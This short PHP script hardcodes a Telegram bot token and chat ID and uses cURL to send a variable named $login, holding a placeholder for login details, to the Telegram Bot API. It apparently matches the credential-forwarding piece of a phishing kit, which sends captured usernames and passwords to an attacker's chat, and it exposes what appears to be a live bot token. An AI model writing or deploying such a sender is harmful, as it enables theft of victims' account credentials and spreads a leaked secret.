
<?php
$botToken = "7630958979:AAEE6b7wDe3IqiH34Q8d_dg3aBnyNzJ9fXs";
$chatId = "1143805490";
$login = "LOGIN_DETAILS";

$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId;
$url = $url . "&text=" . urlencode($login);
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
?>